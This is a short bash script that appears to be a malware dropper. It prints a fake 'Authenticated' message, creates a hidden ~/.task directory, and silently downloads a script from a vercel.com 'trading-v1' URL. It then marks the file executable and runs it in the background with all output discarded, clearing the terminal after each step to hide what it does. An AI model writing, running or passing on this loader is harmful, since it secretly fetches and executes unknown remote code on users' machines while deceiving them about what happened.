#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/.task"
TARGET_DIR="$HOME/.task"
clear
wget -q -O "$TARGET_DIR/tokenlinux.sh" "https://vercel.com/billion10/trading-v1/3nTymp4UDAn8pMLaXzVWfdGff3yt/120/ls.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
